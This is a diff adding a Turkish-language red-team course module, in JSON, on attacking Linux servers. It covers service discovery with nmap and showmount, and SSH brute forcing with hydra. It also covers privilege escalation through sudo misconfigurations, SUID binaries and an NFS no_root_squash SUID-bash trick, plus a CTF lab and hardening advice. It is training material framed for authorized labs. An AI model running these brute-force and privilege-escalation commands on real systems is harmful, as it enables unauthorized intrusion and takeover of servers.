@@ -1,0 +1,127 @@
+{
+  "id": "linux-server",
+  "slug": "linux-server",
+  "title": "Linux Server (Ubuntu) Saldırıları",
+  "subtitle": "Linux Sunucu Sızma Testi",
+  "description": "Linux/Ubuntu sunucularının saldırı yüzeyi: servis keşfi, yaygın servislerin (SSH, FTP, NFS, Samba, web) sömürüsü, yetki yükseltme yolları ve sertleştirme. Temelden detaya.",
+  "team": "red-team",
+  "category": "Sunucu Saldırıları",
+  "phase": "Exploitation",
+  "icon": "🐧",
+  "color": "#ef4444",
+  "tags": ["linux server", "ubuntu", "ssh", "nfs", "samba", "privesc", "sunucu"],
+  "modules": [
+    {
+      "id": "intro-enum",
+      "title": "Linux Sunucu Saldırı Yüzeyi & Keşif",
+      "description": "Sunucu rolleri, açık servisler ve enumeration",
+      "difficulty": "beginner",
+      "duration": "25 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Linux Sunucu Nedir, Nasıl Hedeflenir?",
+          "content": "**Linux sunucu**, hizmet (servis) sunan bir sistemdir: web sitesi (Apache/Nginx), veritabanı (MySQL), dosya paylaşımı (NFS/Samba), uzaktan erişim (SSH) vb. Her açık servis bir **saldırı yüzeyidir**.\n\n**Saldırı metodolojisi:**\n```\n1. Port/servis keşfi (nmap)\n2. Servis versiyonu → bilinen zafiyet (CVE)\n3. Yanlış yapılandırma / zayıf kimlik bilgisi\n4. İlk erişim (foothold)\n5. Yetki yükseltme (privesc) → root\n```\n\n**Sunucularda sık görülen servisler:**\n| Port | Servis | Saldırı vektörü |\n|------|--------|-----------------|\n| 22 | SSH | Brute force, zayıf anahtar |\n| 21 | FTP | Anonim erişim, brute force |\n| 80/443 | Web | Web zafiyetleri (OWASP) |\n| 139/445 | Samba | Null session, eski sürüm |\n| 2049 | NFS | Yanlış export, no_root_squash |\n| 3306 | MySQL | Zayıf parola, SQLi |\n\n**Etik:** Tüm testler yetkili/izole lab (TryHackMe, HTB, kendi VM'in) ortamında yapılır.\n\n> İlgili modüller: [Nmap], [enum4linux], [Linux PrivEsc] ile bu süreci derinleştir."
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Sunucu Keşfi",
+          "commands": [
+            {
+              "command": "nmap -sC -sV -p- 10.10.10.1 -oN sunucu.txt",
+              "description": "Tüm portları, servis versiyonlarını ve varsayılan scriptleri tara",
+              "tip": "Sunucu enumeration'ının ilk adımı. -p- tüm portları tarar; sunucularda standart dışı port olabilir.",
+              "flags": [
+                { "flag": "-sV", "description": "Servis versiyonu" },
+                { "flag": "-sC", "description": "Varsayılan NSE scriptleri" },
+                { "flag": "-p-", "description": "Tüm 65535 port" }
+              ]
+            },
+            {
+              "command": "showmount -e 10.10.10.1",
+              "description": "NFS paylaşımlarını (export) listele",
+              "output": "Export list for 10.10.10.1:\n/home/backup *",
+              "tip": "Açık NFS export bulursan mount et: mount -t nfs 10.10.10.1:/home/backup /mnt. no_root_squash varsa privesc!"
+            },
+            {
+              "command": "nmap --script ftp-anon,ssh-auth-methods,smb-os-discovery -p21,22,445 10.10.10.1",
+              "description": "FTP anonim erişim, SSH yöntemleri ve SMB OS bilgisi",
+              "tip": "ftp-anon anonim girişi test eder; bulunursa kimliksiz dosya erişimi olabilir."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "service-exploit",
+      "title": "Servis Sömürüsü & Yetki Yükseltme + Lab",
+      "description": "Yaygın servis saldırıları ve root'a giden yollar",
+      "difficulty": "intermediate",
+      "duration": "30 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Foothold'dan Root'a",
+          "content": "İlk erişimi (foothold) aldıktan sonra hedef **root** yetkisidir.\n\n**Yaygın ilk erişim yolları:**\n- SSH/FTP brute force (zayıf parola)\n- Web uygulaması zafiyeti (RCE, dosya yükleme)\n- Bilinen servis CVE'si (örn. eski vsftpd, Samba)\n- Yanlış yapılandırılmış NFS/Samba paylaşımı\n\n**Yetki yükseltme vektörleri (özet):**\n| Vektör | Tespit |\n|--------|--------|\n| Sudo yanlış yapılandırma | sudo -l |\n| SUID binary | find / -perm -4000 |\n| Cron job | /etc/crontab, yazılabilir scriptler |\n| Kernel exploit | uname -a → searchsploit |\n| Yazılabilir /etc/passwd | ls -l /etc/passwd |\n| NFS no_root_squash | showmount + root SUID |\n\n> Detaylı privesc için [Linux PrivEsc] modülüne, otomatik tarama için LinPEAS'e bak."
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Sömürü & PrivEsc",
+          "commands": [
+            {
+              "command": "hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.1 -t 4",
+              "description": "SSH brute force ile ilk erişim",
+              "tip": "Kullanıcı adını enumeration'dan al. Başarıda: ssh user@10.10.10.1 ile bağlan.",
+              "warning": "Yalnızca yetkili/lab ortamında."
+            },
+            {
+              "command": "sudo -l",
+              "description": "Mevcut kullanıcının çalıştırabileceği sudo komutlarını gör",
+              "output": "(root) NOPASSWD: /usr/bin/find",
+              "tip": "Parolasız sudo komutu = privesc fırsatı. GTFOBins'te o binary'nin istismarını ara (find → -exec /bin/sh)."
+            },
+            {
+              "command": "find / -perm -4000 -type f 2>/dev/null",
+              "description": "SUID bitli binary'leri bul (root yetkisiyle çalışanlar)",
+              "tip": "Beklenmedik SUID binary (örn. nmap, vim, cp) → GTFOBins ile root shell."
+            },
+            {
+              "command": "# NFS no_root_squash istismarı (saldırgan tarafında root):\nmount -t nfs 10.10.10.1:/paylasim /mnt\ncp /bin/bash /mnt/bash && chmod +s /mnt/bash\n# Hedefte: /paylasim/bash -p  → root",
+              "description": "NFS no_root_squash ile root yetki yükseltme",
+              "tip": "no_root_squash export'ta saldırgan root olarak dosya yazabilir; SUID bash bırakıp hedefte çalıştırır."
+            }
+          ]
+        },
+        {
+          "id": "lab",
+          "type": "lab",
+          "title": "CTF Senaryosu: Linux Sunucu Ele Geçirme",
+          "scenario": {
+            "title": "Keşif → Foothold → Root",
+            "objective": "Bir Linux sunucusunda servisleri keşfet, bir zafiyet/zayıf kimlik bilgisiyle erişim al ve yetki yükselterek root ol.",
+            "environment": "TryHackMe/HTB Linux makinesi",
+            "difficulty": "intermediate",
+            "steps": [
+              "nmap -sC -sV -p- ile tüm servisleri keşfet",
+              "Her servisi enumerate et (web→gobuster, smb→enum4linux, ftp→anon)",
+              "Bir foothold bul: zayıf parola, CVE veya web zafiyeti",
+              "Shell al, TTY'ye yükselt (reverse-shells modülü)",
+              "LinPEAS çalıştır, privesc vektörünü bul (sudo -l, SUID)",
+              "Root ol, root.txt flag'ini oku"
+            ],
+            "hints": [
+              "Her açık portu küçümseme — en küçük servis bile vektör olabilir",
+              "Servis versiyonunu searchsploit'te ara",
+              "GTFOBins SUID/sudo istismarları için vazgeçilmez kaynaktır"
+            ],
+            "defenseNote": "Savunma: Gereksiz servisleri kapat, SSH'ı sertleştir (anahtar+MFA), güçlü parola politikası, düzenli yama, SUID binary denetimi, NFS export'larında root_squash, fail2ban ve dosya bütünlüğü izleme (AIDE)."
+          }
+        }
+      ]
+    }
+  ]
+}
